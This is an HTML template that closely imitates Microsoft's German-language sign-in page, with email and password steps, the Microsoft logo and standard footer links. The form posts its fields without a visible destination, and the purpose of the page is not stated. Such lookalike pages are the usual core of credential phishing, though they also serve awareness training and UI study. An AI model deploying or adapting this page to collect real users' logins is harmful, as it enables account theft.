<div class="cb" style="display: block;">
  <div>
    <form name="f1" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off"
      class="provide-min-height">
      <div class="login-paginated-page">
        <div id="lightboxTemplateContainer" class="provide-min-height">
          <div id="lightboxBackgroundContainer">
            <div class="background-image-holder" role="presentation">
              <div id="backgroundImage" role="img" style="background-image: url(&quot;./img/background.svg&quot;);"
                class="background-image ext-background-image" aria-label="Hintergrundbild der Organisation"></div>
            </div>
          </div>


          <div class="outer">
            <div class="template-section main-section">
              <div class="middle ext-middle">
                <div class="full-height">
                  <div class="flex-column">
                    <div class="win-scroll">
                      <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
                        <div class="lightbox-cover">
                        </div>
                        <div>
                          <img class="logo" role="img" src="img/microsoft-logo.svg" alt="Microsoft">
                        </div>

                        <div role="main" id="username-page">
                          <div>
                            <div class="pagination-view animate slide-in-next">
                              <div>
                                <div>
                                  <div>
                                    <div class="row title ext-title" id="loginHeader">
                                      <div role="heading" aria-level="1">Anmelden</div>
                                    </div>
                                  </div>
                                </div>

                                <div class="row">
                                  <div role="alert" aria-live="assertive">
                                  </div>

                                  <div class="form-group col-md-24">
                                    <div class="placeholderContainer">
                                      <input type="email" name="loginfmt" maxlength="113"
                                        class="form-control ltr_override input ext-input text-box ext-text-box"
                                        aria-required="true" autocomplete="username webauthn"
                                        aria-label="Geben Sie Ihre E-Mail-Adresse, Telefonnummer oder Ihren Skype-Namen ein."
                                        aria-describedby="loginHeader usernameError"
                                        placeholder="E-Mail, Telefon oder Skype">

                                      <input name="passwd" type="password" class="moveOffScreen" tabindex="-1"
                                        aria-hidden="true">
                                    </div>
                                  </div>
                                </div>

                                <div
                                  class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                  <div class="row">
                                    <div class="col-md-24">
                                      <div class="text-13">
                                        <div class="form-group">Kein Konto? <a href="#" id="signup"
                                            aria-label="Microsoft-Konto erstellen">Erstellen Sie jetzt
                                            eins!</a></div>

                                        <div class="form-group">
                                          <a id="cantAccessAccount" name="cannotAccessAccount" href="#">Sie können nicht
                                            auf Ihr Konto zugreifen?</a>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>

                                <div class="win-button-pin-bottom">
                                  <div class="row">
                                    <div>
                                      <div
                                        class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">
                                        <div class="inline-block button-item ext-button-item">
                                          <input type="submit" id="idSIButton9"
                                            class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary"
                                            value="Weiter">
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div role="main" id="password-page" hidden>
                          <div>
                            <div class="animate slide-in-next">

                              <div>

                                <div class="identityBanner">
                                  <button type="button" class="backButton" id="idBtn_Back" aria-label="Zurück"><img
                                      role="presentation" src="img/arrow-left.svg">
                                  </button>
                                  <div id="displayName" class="identity" title="you@example.com">
                                    you@example.com</div>
                                </div>
                              </div>
                            </div>
                            <div class="pagination-view has-identity-banner animate slide-in-next">
                              <div>


                                <div id="loginHeader" class="row title ext-title">
                                  <div role="heading" aria-level="1">
                                    Kennwort eingeben</div>
                                </div>

                                <div class="row">
                                  <div class="form-group col-md-24">
                                    <div role="alert" aria-live="assertive">
                                    </div>

                                    <div class="placeholderContainer">

                                      <input name="passwd" type="password" id="i0118"
                                        class="form-control input ext-input text-box ext-text-box" aria-required="true"
                                        autocomplete="current-password" aria-describedby="loginHeader passwordError  "
                                        placeholder="Kennwort"
                                        aria-label="Geben Sie das Kennwort für &quot;you@example.com&quot; ein."
                                        tabindex="0">
                                    </div>
                                  </div>
                                </div>

                                <div
                                  class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                  <div>
                                    <div class="row">
                                      <div class="col-md-24">
                                        <div class="text-13">
                                          <div class="form-group">
                                            <a id="idA_PWD_ForgotPassword" href="#" target="" role="link">Kennwort
                                              vergessen</a>
                                          </div>

                                          <div class="form-group">
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>

                                <div class="win-button-pin-bottom">
                                  <div class="row">
                                    <div>
                                      <div
                                        class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">

                                        <div class="inline-block button-item ext-button-item">
                                          <input type="submit" id="idSIButton9"
                                            class="win-button button_primary high-contrast-overrides button ext-button primary ext-primary"
                                            value="Anmelden">
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>

                      </div>
                      <div>
                        <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
                          <div class="promoted-fed-cred-content">
                            <div class="tile-container">
                              <div class="row tile">
                                <div class="table" role="button" tabindex="0" aria-label="Anmeldeoptionen undefined">

                                  <div class="table-row">
                                    <div class="table-cell tile-img medium">
                                      <img class="tile-img medium" role="presentation" src="img/signin-options.svg">
                                    </div>
                                    <div class="table-cell text-left content">
                                      <div>Anmeldeoptionen</div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>

                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div id="footer" role="contentinfo" class="footer ext-footer">

              <div>
                <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">

                  <a id="ftrTerms" href="#"
                    class="footer-content ext-footer-content footer-item ext-footer-item">Nutzungsbedingungen</a>

                  <a id="ftrPrivacy" href="#"
                    class="footer-content ext-footer-content footer-item ext-footer-item">Datenschutz und Cookies</a>


                  <a id="moreOptions" href="#" role="button"
                    aria-label="Klicken Sie hier, um weitere Informationen zur Problembehandlung zu erhalten."
                    aria-expanded="false"
                    class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                </div>

              </div>
            </div>
          </div>
        </div>
      </div>
    </form>
  </div>
</div>
